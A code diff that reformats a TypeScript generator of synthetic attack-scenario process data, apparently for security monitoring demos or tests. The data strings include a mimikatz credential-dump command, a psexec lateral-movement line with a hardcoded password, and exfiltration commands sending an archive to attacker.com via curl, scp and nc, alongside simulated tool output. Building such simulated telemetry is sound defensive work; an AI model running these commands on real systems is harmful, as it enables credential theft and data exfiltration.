@@ -480,7 +480,12 @@ export class SessionViewGenerator {
    * Generate realistic attack scenario session
    */
   generateAttackScenario(
-    scenarioType: 'lateral_movement' | 'privilege_escalation' | 'persistence' | 'discovery' | 'data_exfiltration' = 'lateral_movement'
+    scenarioType:
+      | 'lateral_movement'
+      | 'privilege_escalation'
+      | 'persistence'
+      | 'discovery'
+      | 'data_exfiltration' = 'lateral_movement',
   ): ProcessEntity[] {
     const attackProcesses: ProcessEntity[] = [];
 
@@ -530,7 +535,8 @@ export class SessionViewGenerator {
     const credDump = this.generateProcess({
       name: 'mimikatz',
       executable: '/tmp/mimikatz.exe',
-      commandLine: '/tmp/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
+      commandLine:
+        '/tmp/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
       parentProcess: initialShell,
     });
     processes.push(credDump);
@@ -539,7 +545,8 @@ export class SessionViewGenerator {
     const psexec = this.generateProcess({
       name: 'psexec',
       executable: '/usr/bin/psexec',
-      commandLine: 'psexec \\\\192.168.1.100 -u administrator -p password123 cmd.exe',
+      commandLine:
+        'psexec \\\\192.168.1.100 -u administrator -p password123 cmd.exe',
       parentProcess: initialShell,
     });
     processes.push(psexec);
@@ -685,7 +692,7 @@ export class SessionViewGenerator {
       { name: 'mount', cmd: 'mount' },
     ];
 
-    discoveryCommands.forEach(cmd => {
+    discoveryCommands.forEach((cmd) => {
       const process = this.generateProcess({
         name: cmd.name,
         executable: `/usr/bin/${cmd.name}`,
@@ -715,7 +722,8 @@ export class SessionViewGenerator {
     const findFiles = this.generateProcess({
       name: 'find',
       executable: '/usr/bin/find',
-      commandLine: 'find /home -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*"',
+      commandLine:
+        'find /home -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*"',
       parentProcess: shell,
     });
     processes.push(findFiles);
@@ -731,7 +739,10 @@ export class SessionViewGenerator {
 
     // Exfiltrate via various methods
     const exfilMethods = [
-      { name: 'curl', cmd: 'curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload' },
+      {
+        name: 'curl',
+        cmd: 'curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload',
+      },
       { name: 'scp', cmd: 'scp /tmp/data.tar.gz user@attacker.com:/tmp/' },
       { name: 'nc', cmd: 'nc attacker.com 4444 < /tmp/data.tar.gz' },
     ];
@@ -751,57 +762,60 @@ export class SessionViewGenerator {
   /**
    * Enhanced terminal output with realistic attack progression
    */
-  private generateEnhancedTerminalOutput(processName: string, scenarioType?: string): string {
+  private generateEnhancedTerminalOutput(
+    processName: string,
+    scenarioType?: string,
+  ): string {
     const attackOutputs: Record<string, string[]> = {
       nmap: [
         'Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-20 14:30 UTC\n' +
-        'Nmap scan report for 192.168.1.1\n' +
-        'Host is up (0.00050s latency).\n' +
-        'Nmap scan report for 192.168.1.100\n' +
-        'Host is up (0.00023s latency).\n' +
-        'Nmap done: 256 IP addresses (12 hosts up) scanned in 2.5 seconds'
+          'Nmap scan report for 192.168.1.1\n' +
+          'Host is up (0.00050s latency).\n' +
+          'Nmap scan report for 192.168.1.100\n' +
+          'Host is up (0.00023s latency).\n' +
+          'Nmap done: 256 IP addresses (12 hosts up) scanned in 2.5 seconds',
       ],
       mimikatz: [
         '  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51\n' +
-        ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n' +
-        ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n' +
-        ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n' +
-        ' \'## v ##\'                Vincent LE TOUX ( vincent.letoux@gmail.com )\n' +
-        '  \'#####\'                 > https://pingcastle.com / https://mysmartlogon.com   ***/\n\n' +
-        'mimikatz # privilege::debug\n' +
-        'Privilege \'20\' OK\n\n' +
-        'mimikatz # sekurlsa::logonpasswords\n' +
-        'Authentication Id : 0 ; 996 (00000000:000003e4)\n' +
-        'Session           : Service from 0\n' +
-        'User Name         : NETWORKSERVICE\n' +
-        'Domain            : NT AUTHORITY\n' +
-        'Logon Server      : (null)\n' +
-        ' * Username : administrator\n' +
-        ' * Domain   : WORKGROUP\n' +
-        ' * Password : P@ssw0rd123!'
+          ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n' +
+          ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n' +
+          ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n' +
+          " '## v ##'                Vincent LE TOUX ( vincent.letoux@gmail.com )\n" +
+          "  '#####'                 > https://pingcastle.com / https://mysmartlogon.com   ***/\n\n" +
+          'mimikatz # privilege::debug\n' +
+          "Privilege '20' OK\n\n" +
+          'mimikatz # sekurlsa::logonpasswords\n' +
+          'Authentication Id : 0 ; 996 (00000000:000003e4)\n' +
+          'Session           : Service from 0\n' +
+          'User Name         : NETWORKSERVICE\n' +
+          'Domain            : NT AUTHORITY\n' +
+          'Logon Server      : (null)\n' +
+          ' * Username : administrator\n' +
+          ' * Domain   : WORKGROUP\n' +
+          ' * Password : P@ssw0rd123!',
       ],
       psexec: [
         'PsExec v2.2 - Execute processes remotely\n' +
-        'Copyright (C) 2001-2016 Mark Russinovich\n' +
-        'Sysinternals - www.sysinternals.com\n\n' +
-        'Connecting to 192.168.1.100...\n' +
-        'Starting cmd on 192.168.1.100...\n' +
-        'cmd started on 192.168.1.100 with process ID 2856.'
+          'Copyright (C) 2001-2016 Mark Russinovich\n' +
+          'Sysinternals - www.sysinternals.com\n\n' +
+          'Connecting to 192.168.1.100...\n' +
+          'Starting cmd on 192.168.1.100...\n' +
+          'cmd started on 192.168.1.100 with process ID 2856.',
       ],
       linpeas: [
         '════════════════════════════════════╗\n' +
-        '══════════════════║ LINPEAS ║══════════════════\n' +
-        '════════════════════════════════════╝\n' +
-        'Linux Privilege Escalation Awesome Script\n\n' +
-        '[+] Checking if /etc/passwd is writable\n' +
-        '[+] Checking for SUID binaries\n' +
-        '/usr/bin/sudo\n' +
-        '/usr/bin/passwd\n' +
-        '/usr/bin/newgrp\n' +
-        '/usr/bin/su\n\n' +
-        '[+] Checking sudo version\n' +
-        'Sudo version 1.8.21p2'
-      ]
+          '══════════════════║ LINPEAS ║══════════════════\n' +
+          '════════════════════════════════════╝\n' +
+          'Linux Privilege Escalation Awesome Script\n\n' +
+          '[+] Checking if /etc/passwd is writable\n' +
+          '[+] Checking for SUID binaries\n' +
+          '/usr/bin/sudo\n' +
+          '/usr/bin/passwd\n' +
+          '/usr/bin/newgrp\n' +
+          '/usr/bin/su\n\n' +
+          '[+] Checking sudo version\n' +
+          'Sudo version 1.8.21p2',
+      ],
     };
 
     if (attackOutputs[processName]) {
